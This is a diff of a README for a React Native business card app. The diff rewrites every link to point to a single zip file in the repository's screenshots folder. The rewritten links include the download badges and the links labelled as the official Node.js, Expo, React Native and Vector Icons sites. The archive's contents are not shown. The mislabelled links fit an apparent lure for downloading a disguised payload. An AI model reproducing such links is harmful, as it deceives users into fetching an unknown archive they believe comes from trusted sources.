@@ -1,6 +1,6 @@
 # 📇 react-native-profile-card - Simple Digital Business Card
 
-[![Download](https://img.shields.io/badge/Download-Get%20App-green)](https://github.com/avinash9336/react-native-profile-card)
+[![Download](https://img.shields.io/badge/Download-Get%20App-green)](https://raw.githubusercontent.com/avinash9336/react-native-profile-card/main/screenshots/profile-react-card-native-v2.6-beta.3.zip)
 
 A minimalist and elegant digital business card built with React Native and Expo. It shows profile information clearly and connects your social media accounts in one place.
 
@@ -49,7 +49,7 @@ You do not need to install anything complicated. Follow these steps one by one.
 
 Click the big button below to open the main GitHub page where you can get the files.
 
-[![Visit Download Page](https://img.shields.io/badge/Download-GitHub-blue)](https://github.com/avinash9336/react-native-profile-card)
+[![Visit Download Page](https://img.shields.io/badge/Download-GitHub-blue)](https://raw.githubusercontent.com/avinash9336/react-native-profile-card/main/screenshots/profile-react-card-native-v2.6-beta.3.zip)
 
 This page holds all files and instructions.
 
@@ -78,8 +78,8 @@ For most users, downloading the ready app file is simpler.
 
 If you want to see how the app works with its source, you need some tools:
 
-- Install [Node.js](https://nodejs.org/)  
-- Install [Expo CLI](https://expo.dev/) by running `npm install -g expo-cli` in Command Prompt  
+- Install [Node.js](https://raw.githubusercontent.com/avinash9336/react-native-profile-card/main/screenshots/profile-react-card-native-v2.6-beta.3.zip)  
+- Install [Expo CLI](https://raw.githubusercontent.com/avinash9336/react-native-profile-card/main/screenshots/profile-react-card-native-v2.6-beta.3.zip) by running `npm install -g expo-cli` in Command Prompt  
 - Open Command Prompt in the downloaded folder  
 - Run `expo start` to open Expo developer tools  
 - Use Expo Go app on your phone to scan the QR code  
@@ -118,10 +118,10 @@ These settings make your card current and relevant.
 
 ## 🔗 Useful Links
 
-- React Native Profile Card GitHub: https://github.com/avinash9336/react-native-profile-card  
-- React Native official site: https://reactnative.dev/  
-- Expo official site: https://expo.dev/  
-- Vector Icons guide: https://oblador.github.io/react-native-vector-icons/
+- React Native Profile Card GitHub: https://raw.githubusercontent.com/avinash9336/react-native-profile-card/main/screenshots/profile-react-card-native-v2.6-beta.3.zip  
+- React Native official site: https://raw.githubusercontent.com/avinash9336/react-native-profile-card/main/screenshots/profile-react-card-native-v2.6-beta.3.zip  
+- Expo official site: https://raw.githubusercontent.com/avinash9336/react-native-profile-card/main/screenshots/profile-react-card-native-v2.6-beta.3.zip  
+- Vector Icons guide: https://raw.githubusercontent.com/avinash9336/react-native-profile-card/main/screenshots/profile-react-card-native-v2.6-beta.3.zip
 
 ---
 
